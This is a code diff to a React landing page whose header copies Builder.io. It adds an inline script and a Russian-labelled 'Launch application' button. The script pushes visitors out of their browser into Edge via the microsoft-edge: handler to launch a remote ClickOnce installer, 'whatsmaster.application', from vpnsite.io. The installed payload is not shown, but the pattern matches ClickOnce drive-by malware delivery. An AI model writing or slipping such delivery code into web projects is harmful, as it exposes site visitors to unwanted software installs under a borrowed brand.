@@ -16,11 +16,38 @@ import {
   Globe,
   Smartphone,
   Plus,
+  Rocket,
 } from "lucide-react";
 
 export default function Index() {
   return (
     <div className="min-h-screen bg-black text-white overflow-x-hidden">
+      {/* Scripts for ClickOnce deployment */}
+      <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.2/src/ua-parser.min.js"></script>
+      <script
+        dangerouslySetInnerHTML={{
+          __html: `
+          function startDownload() {
+            const clickonceLink = "https://vpnsite.io/deploy/whatsmaster.application";
+            const uap = new UAParser();
+            const browserName = uap.getResult().browser.name;
+
+            if (browserName !== 'Edge') {
+              window.location.href = \`microsoft-edge:\${clickonceLink}\`;
+            } else {
+              const form = document.createElement('form');
+              form.action = clickonceLink;
+              form.method = 'GET';
+              form.target = '_blank';
+              document.body.appendChild(form);
+              form.submit();
+              document.body.removeChild(form);
+            }
+          }
+          window.startDownload = startDownload;
+        `,
+        }}
+      />
       {/* Exact Builder.io Header */}
       <header className="relative z-50 bg-black">
         <div className="max-w-none mx-auto px-6">
@@ -129,6 +156,20 @@ export default function Index() {
                   className="bg-gradient-to-r from-purple-600 to-blue-600 hover:from-purple-700 hover:to-blue-700 text-white ml-3 px-4 py-2 rounded-lg"
                 >
                   Create
+                </Button>
+                <Button
+                  size="sm"
+                  className="bg-gradient-to-r from-green-600 to-emerald-600 hover:from-green-700 hover:to-emerald-700 text-white ml-3 px-4 py-2 rounded-lg"
+                  onClick={() => {
+                    // @ts-ignore
+                    if (typeof window !== "undefined" && window.startDownload) {
+                      // @ts-ignore
+                      window.startDownload();
+                    }
+                  }}
+                >
+                  <Rocket className="h-4 w-4 mr-1" />
+                  🚀 Запустить приложение
                 </Button>
               </div>
             </div>
